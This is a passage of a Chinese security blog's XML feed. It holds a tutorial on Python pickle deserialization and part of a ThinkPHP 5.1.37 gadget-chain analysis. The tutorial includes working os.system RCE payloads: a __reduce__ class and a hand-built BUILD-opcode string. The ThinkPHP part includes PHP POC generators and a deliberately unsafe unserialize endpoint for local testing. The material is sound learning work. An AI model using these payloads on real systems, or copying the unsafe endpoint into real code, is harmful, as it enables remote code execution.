            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python反序列化分析</title>
      <link href="/2023/01/31/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
      <url>/2023/01/31/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次学习是在有php反序列化基础上的，所以基础的什么是序列化和反序列化不必再说。与php反序列化类似，就是将程序运行的对象实例转换为字符串储存起来，在后续需要使用的时候就恢复原来的状态。当然，在python语言里也有类似于serialize和unserialize这样的函数，他们分别为序列化函数pickle.dumps和反序列化函数pickle.loads函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.dumps将对象反序列化为字符串</span><br><span class="line">pickle.dump将反序列化后的字符串存储为文件</span><br><span class="line">pickle.loads() #对象反序列化</span><br><span class="line">pickle.load() #对象反序列化，从文件中读取数据</span><br></pre></td></tr></table></figure><p>python2和python3序列化出来的字符串是不一样的，python3添加了不可见字符。在这里就以python3环境为例，那就先举一个例子。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.name = <span class="string">&#x27;Xiao&#x27;</span></span><br><span class="line">        self.age = <span class="string">&#x27;18&#x27;</span></span><br><span class="line"> </span><br><span class="line">a = test()</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(a))</span><br></pre></td></tr></table></figure><p>那么生成的序列化链为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x80\x04\x956\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04test\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x04Xiao\x94\x8c\x03age\x94\x8c\x0218\x94ub.</span><br></pre></td></tr></table></figure><p>乍一看很难懂，但是有的大佬直接手撸链子，别急，后面慢慢说。想了解原理的师傅可以读一下pickle库的源码。</p><h2 id="反序列化字符串分析"><a href="#反序列化字符串分析" class="headerlink" title="反序列化字符串分析"></a>反序列化字符串分析</h2><p>接下来我们来说一下pickle库自带的调试器——pickletools。那为什么要有这个调试器。那当然是方便我们研究啦，要不然我们怎么才能读懂上面生成的序列化字符串呢？它对上面字符串的每一个字符都做了解释，来举一个例子。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.name = <span class="string">&#x27;Xiao&#x27;</span></span><br><span class="line">        self.age = <span class="string">&#x27;18</span></span><br><span class="line"><span class="string">a = test()</span></span><br><span class="line"><span class="string">b = pickle.dumps(a)</span></span><br><span class="line"><span class="string">print(b)</span></span><br><span class="line"><span class="string">pickletools.dis(b)</span></span><br></pre></td></tr></table></figure><p>看结果：</p><img src="/2023/01/31/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/34.png" class><p>这是反汇编，解析序列化字符串，并且告诉你每一部分代表什么意思，每一行都代表了一个指令，但是光看这全是指令的东西还是不明白。所以还需要进一步的说明。根据上面解析的结果一步步的分析。</p><p>pickle构造出的字符串，有很多个版本。在dumps或loads时，可以用Protocol参数指定协议版本，例如指定为0号版本，目前这些协议有0,2,3,4号版本，默认为3号版本。所以说上面结果第一行就是3了。0号版本是人类可读的，就类似于这样，</p><img src="/2023/01/31/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/35.png" class><p> 这是使用python2执行的结果，以后的版本就加了不可打印字符。值得一提的是,pickle是向前兼容的，0版本字符串不管在什么环境都可以反序列化成功。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x80 PROTO 3表示使用3号版本序列化字符串，机器读取一个字节，变成\x03，操作结束</span><br><span class="line">c GLOBALS操作符，连续读取两个字符串，module和name，以\n分隔，在这里为__main__和test</span><br><span class="line">q BINPUT 这个操作符没有什么影响，应该就是把当前栈栈顶复制一份到储存区。</span><br><span class="line">) EMPTY_TUPLE 把一个空的tuple压入当前栈</span><br><span class="line">\x81 NEWOBJ 从栈中弹出一个参数和一个class，然后利用这个参数实例化class，把得到的实例压进栈</span><br><span class="line">&#125; EMPTY_DICT 把一个空的dict压进栈</span><br><span class="line">( MARK 把当前栈这个整体作为list压进前序栈，并把当前栈清空，前序栈保存了程序运行的完整的信息，而当前栈只处理栈顶的事件。</span><br><span class="line">X BINUNICODE 读入字符串，并且把它压进栈中，也就是类属性与值。</span><br><span class="line">u SETITEMS 把当前栈的内容扔进一个数组，然后恢复MARK的状态。此时当前栈就存在__main__.test和dict，取出dict并读入数组的值，两两配对，前者为键，后者为值，也就是&#123;&#x27;name&#x27;:&#x27;xiao&#x27;,&#x27;age&#x27;:&#x27;18&#x27;&#125;</span><br><span class="line">b BUILD 弹出栈中的数据，结束流程</span><br><span class="line">. stop 字符串已弹出，结束</span><br></pre></td></tr></table></figure><p>使用pickletools.optimize函数对序列化串进行优化，删除了BINPUT无用指令，更好分析。</p><img src="/2023/01/31/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/36.png" class><p>说到这里应该对pickle生成序列化字符串有了初步的认识。</p><h2 id="reduce-方法"><a href="#reduce-方法" class="headerlink" title="__reduce__方法"></a>__reduce__方法</h2><p>反序列化执行命令的重要魔术方法。我们可以在这个方法里构造命令去执行。看个例子。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;ls / &#x27;</span>,))</span><br><span class="line">a = test()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line">c = pickletools.optimize(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">pickletools.dis(c)</span><br></pre></td></tr></table></figure><p>返回值要么是字符串，要么就是元组。</p><img src="/2023/01/31/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/37.png" class><p>reduce方法在pickle反序列化时会自动执行，就是利用了R指令，它主要做的事情是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">取当前栈的栈顶记为args，然后把它弹掉。</span><br><span class="line">取当前栈的栈顶记为f，然后把它弹掉。以args为参数，执行函数f，把结果压进当前栈。</span><br></pre></td></tr></table></figure><p> 目前ctf题目大多都是用reduce方法来执行命令。构造恶意字符串，在反序列化时执行恶意命令。那么要过滤掉reduce该怎么做，reduce是否能调用成功完全取决于R指令是否存在，那么我们过滤掉R指令就会完全堵死这个思路。起初我认为python的反序列化就是调用reduce方法，但是接下来说一下比较奇特的思路。</p><h2 id="c指令码（覆盖全局变量）"><a href="#c指令码（覆盖全局变量）" class="headerlink" title="c指令码（覆盖全局变量）"></a>c指令码（覆盖全局变量）</h2><p>回看上面的内容，c指令是干什么用的？获取全局变量，读取module和name，看一个例子更好理解c指令是怎么用的。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b</span>):</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;?&#x27;</span> <span class="comment">#序列化串</span></span><br><span class="line">other_flag = pickle.loads(payload)</span><br><span class="line">secret_flag = test(secret.a,secret.b)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> other_flag.a == secret_flag.a <span class="keyword">and</span> other_flag.b == secret_flag.b:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;XXXXXXXXXX&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br></pre></td></tr></table></figure><p>我们不知道secret.py中a和b参数的值，那该怎么满足相等。先看一个正常的test类。</p><img src="/2023/01/31/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/41.png" class><p>我们可以利用c指令来把aa和bb换成secret.a和b，说白了，就是手动修改序列化串。那么以name为例，把aa修改为secret.a就是将X\x02\x00\x00\x00aa替换为csecret\na\n。注意前面有个c，_变成\n，这样就达到覆盖变量的效果了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原来的序列化串：</span><br><span class="line">\x80\x03c__main__\ntest\nq\x00)\x81q\x01&#125;q\x02(X\x01\x00\x00\x00aq\x03X\x02\x00\x00\x00aaq\x04X\x01\x00\x00\x00bq\x05X\x02\x00\x00\x00bbq\x06ub.</span><br><span class="line">替换后的序列化串：</span><br><span class="line">\x80\x03c__main__\ntest\nq\x00)\x81q\x01&#125;q\x02(X\x01\x00\x00\x00aq\x03csecret\na\nq\x04X\x01\x00\x00\x00bq\x05csecret\nb\nq\x06ub.</span><br></pre></td></tr></table></figure><p>用师傅的例子本地测试不成功，我也很异或呢？总之覆盖变量就是这样一个改法。</p><h2 id="BUILD指令"><a href="#BUILD指令" class="headerlink" title="BUILD指令"></a>BUILD指令</h2><p>之前说到过，reduce方法是可以执行rce的，那么如果题目中禁用掉了reduce，我们还能执行命令吗？先在pickle源码中找到BUILD指令的具体实现代码：</p><img src="/2023/01/31/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/42.png" class><p>大致的意思就是利用getattr函数来判断inst是否拥有__setstate__这个方法，如果拥有，就调用这个方法，如果没有，就把state这个字典的内容合并到inst_dict里，假设原本的类中没有__setatate__这个方法，我们利用{‘<strong>setstate</strong>‘: os.system}来BUILD这个对象，当BUILD指令执行时，由于原本的类中是没有__setstate__方法的，然后它会添加__setstate__方法，而这个方法的内容就是os.system，那么接下来我们再利用”ls &#x2F;“来BUILD这个对象，由于有了__setstate__方法，就会调用这个方法，也就是执行了os.system，然后就执行了RCE。</p><p>说这么多不如举个例子：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">a = <span class="built_in">print</span>(pickle.dumps(test()))</span><br><span class="line"><span class="built_in">print</span>(pickletools.dis(pickle.dumps(test())))</span><br></pre></td></tr></table></figure><p>看看结果：</p><img src="/2023/01/31/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/43.png" class><p>现在我们要手动构造payload，先构造一个字典。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\ntest\nq\x00)\x81&#125;.&#x27;#&#125;在上文有解释</span><br></pre></td></tr></table></figure><p>然后添加MARK指令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\ntest\nq\x00)\x81&#125;(.&#x27;</span><br></pre></td></tr></table></figure><p>添加键值对，注意这里添加值要配合c指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\ntest\nq\x00)\x81&#125;(V__setstate__\ncos\nsystem\nu.&#x27;</span><br></pre></td></tr></table></figure><p>最后加上b，执行第一次BUIILD。</p><p>继续添加参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\ntest\nq\x00)\x81&#125;(V__setstate__\ncos\nsystem\nubVwhoami\n.&#x27;</span><br></pre></td></tr></table></figure><p>然后添加b生成最终payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\ntest\nq\x00)\x81&#125;(V__setstate__\ncos\nsystem\nubVwhoami\nb.&#x27;</span><br></pre></td></tr></table></figure><p>在本地测试的确可以执行RCE呢。</p><img src="/2023/01/31/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/44.png" class><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>以上主要说python3的反序列化链，了解了python3的序列化机制，那么python2也应该很好理解了。本文主要记录自己对python反序列化的初步学习，若文章有错误之处欢迎师傅指正。</p><p>好的技术文章是我们初学者的福音，所以推荐以下两位师傅的文章：</p><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎</a></p><p><a href="https://www.freebuf.com/articles/web/264363.html">Python pickle 反序列化详解 - FreeBuf网络安全行业门户</a></p>]]></content>
      
      
      <categories>
          
          <category> python安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp5.1.37反序列化链子分析</title>
      <link href="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/"/>
      <url>/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天一直在搞一个<a href="https://so.csdn.net/so/search?q=thinkphp&spm=1001.2101.3001.7020">thinkphp</a>框架的一个反序列化漏洞，tp框架的链子很长，用到的函数也很多，思维也比较跳跃，在此用比较通俗易懂的语言分析反序列化链子的构造以及复现。以便自己日后复习，也希望能帮助到小师傅们。（大佬轻点喷）</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这个tp5.1.37的源码可以在github上下载，也可以用composer来下载，个人推荐第二种，很方便，在github上需要下载两部分，网址分别为：</p><p><a href="https://github.com/top-think/framework/releases/tag/v5.1.37">https://github.com/top-think/framework/releases/tag/v5.1.37</a></p><p><a href="https://github.com/top-think/think/releases/tag/v5.1.37">https://github.com/top-think/think/releases/tag/v5.1.37</a></p><p>这两部分下载完成后放到本机上的www目录（用过小皮都懂）把第一个下载的文件夹改名为thinkphp并且放在第二个下载的文件夹里就ok了。本地访问成功。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/11.png" class><p>原本下载的源码是没有反序列化入口的， 我们需要自己来写一个入口。那肯定是要在控制器里去改，你也可以自己写个控制器，我就在\application\index\controller里的index.php里添加代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unser</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$tmp</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后我们访问&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;unser,然后post传参，看它能不能正确回显。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/12.png" class><p>很显然是可以的，那么环境搭建就到此结束。</p><h2 id="反序列化链分析"><a href="#反序列化链分析" class="headerlink" title="反序列化链分析"></a>反序列化链分析</h2><p>通常我们找链子怎么起步呢？一般都是找__destruct()销毁方法或者是wakeup这种反序列化会自动调用的，我们一般是首选。那么我们就先搜索__destruct方法，这里我们进入windows类里面的销毁方法，</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/13.png" class><p>发现它调用了removeFiles()方法，继续跟进。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/14.png" class><p>这里就是将files数组遍历，然后判断文件是否存在，files是windows类的一个属性，我们是可控的，这里文件如果存在，就会删除，那么这里就有一个任意文件删除的漏洞，当然，这不是我们的目的，file_exists函数会把传进来的参数当作字符串，那么如果我们传一个类进去，会不会就触发了这个类的toString()方法，这很好理解，那么接下来 我们就需要找什么类调用了toString()方法。这里我们利用Conversion类里的toString()方法。</p><h3 id="避雷"><a href="#避雷" class="headerlink" title="避雷"></a>避雷</h3><p>这里我们可不能直接去实例化Conversion类，为什么呢？因为Conversion类是由trait这个关键字定义的，那么这个关键字是啥意思。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 实现了一种代码复用的方法，称为 trait。</span><br><span class="line"> </span><br><span class="line">Trait 是为类似 PHP 的单继承语言而准备的一种代码复用机制。Trait 为了减少单继承语言的限制，使开发人员能够自由地在不同层次结构内独立的类中复用 method。Trait 和 Class 组合的语义定义了一种减少复杂性的方式，避免传统多继承和 Mixin 类相关典型问题。</span><br><span class="line"> </span><br><span class="line">Trait 和 Class 相似，但仅仅旨在用细粒度和一致的方式来组合功能。 无法通过 trait 自身来实例化。它为传统继承增加了水平特性的组合；也就是说，应用的几个 Class 之间不需要继承。</span><br></pre></td></tr></table></figure><p>所以说，Conversion类是不能直接实例化的，那么就要找引用它的子类了。这里有Model类继承了Conversion类，</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/15.png" class><p>这里是引用了Conversion类的，但是Model类是由adstract关键字修饰的，所以也不能直接实例化，接下来就要找继承了Model类的子类了，</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/16.png" class><p>这里找到一个Pivot类，那么往回看，我们让files去实例化这个类，是不是就可以调用toString方法了，当然Pivot类本身是没有tostring方法，但是它会向父类去寻找，最终调用了Conversion类中的tostring方法。一个简单的逻辑图。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/17.png" class><p> 调用完tostring()魔术方法，第一阶段算是完成。开始编写这一块的poc。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们打一下payload，看看是否调用了tostring()函数。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/18.png" class><p>这里成功调用了tostring()方法了。</p><p>那么接下来就主看Conversion类，这里tostring里调用了tojson()函数。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/19.png" class><p>跟进tojson函数， 发现里面是调用了toArray函数</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/20.png" class><p>那么继续跟进toArray函数。这个函数的代码很长，我只放关键部分。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/21.png" class><p>append是我们的私有属性数组，它可控，那么name也可控，那么我们跟进getRelation函数，在Relationship类中有具体的实现方法，</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/22.png" class><p>这里的name参数就是key，可控，这里的relation为空，那么这个函数返回为空，继续看toArray函数，往下走，if判断，因为getRelation函数返回为空，然后进行！处理变为true进入到了我们的if语句里。再跟进getAttr函数。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/23.png" class><p>这个函数的name参数就是append的键名，也是可控的，继续跟进getData函数，</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/24.png" class><p>这里的name我们说了是append的键名，如果这个键名在data数组里存在，就会返回data数组name键名下的值，（别晕！）那么我们可以任意构造值，最后返回给relation变量，那么这个relation对于我们来说就可控了。继续看toArray的代码，它最后会调用不知名函数。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/25.png" class><p> 在这里，如果我们构造的relation是一个不存在visible方法的类对象，那么是不是就可以调用这个类中的__call方法。那么我们就找哪些类利用了call方法。这里使用request类中的call方法。想要成功调用，必须得满足data数组里存在append的键名。</p><p>目前还有一个问题，怎么进行变量覆盖，这里append属性和data属性我们都在Model类中进行修改，为什么可以这样？</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/26.png" class><p>Conversion类和Attribute类Model类中都引用到了，那么他们对应的append属性和data属性是不是都可以通过这个类进行覆盖了。那么在上一个poc上继续编写</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;li&quot;</span>=&gt;[]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;li&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们继续本地测试，看我们编写的poc能不能调用我们的call方法。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/27.png" class><p>测试是可以的。第二阶段完成。那么来到了最后一个阶段。</p><p>继续跟进call方法</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/28.png" class><p>这里有一个call_user_func_array函数我们可以任意函数调用，在这里我要说一下call方法的两个参数，method参数就是visible，而args就是这个函数的参数。（没印象的回看代码）这里判断method参数在hook数组里是否存在，那么我们就应该满足这个条件，让hook的键名赋值为visible。因为array_unshift函数会把本类对象插进数组前面，那么我们调用system函数就会对象转字符串发生报错。同理，这里我们要调用经典利用点input函数，但是这个函数我们也不能直接调，那么继续找调用了input函数的函数，找到了param函数，我们依然不能直接调，继续往上找，就找到了isAjax函数，这里不会强制转换报错。那么就跟进isAjax函数。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/29.png" class><p>这里调用了param函数，继续跟进</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/30.png" class><p>中间的两个if，在正常情况下不会进入，我们也不需要让它进入。这里就调用了input函数。这里的param属性和filter属性我们都可控。继续跟进input函数。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/31.png" class><p>这中间又是两个if，只要满足name属性为空就可以绕过这两个if分支。这里的data我们不可控，但是默认为空数组。然后就调用了array_walk_recursive函数，这个函数会调用filterValue函数，那么就继续跟进吧。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/32.png" 